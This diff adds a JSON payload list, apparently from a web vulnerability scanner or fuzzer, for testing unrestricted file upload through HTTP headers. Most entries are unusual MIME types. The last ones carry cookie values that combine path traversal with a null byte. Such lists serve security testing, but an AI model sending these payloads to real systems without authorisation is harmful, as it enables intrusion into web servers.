@@ -1,0 +1,101 @@
+[
+  {
+    "payload_id": "OWP-395816",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "x-conference/x-cooltalk",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-395817",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "x-music/x-midi",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-395818",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "x-world/x-3dmf",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-395819",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "x-world/x-svr",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-395820",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "x-world/x-vrml",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-395821",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "x-world/x-vrt",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-408141",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "Content-Type: #{mimetype}\\r\\n",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-408198",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "Cookie: PNSVlang=../upload/dl/hauru.gif%00;\\r\\n",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-408224",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "Cookie: PNSVlang=../../../upload/dl/hauru.gif%00;\\r\\n",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  }
+]
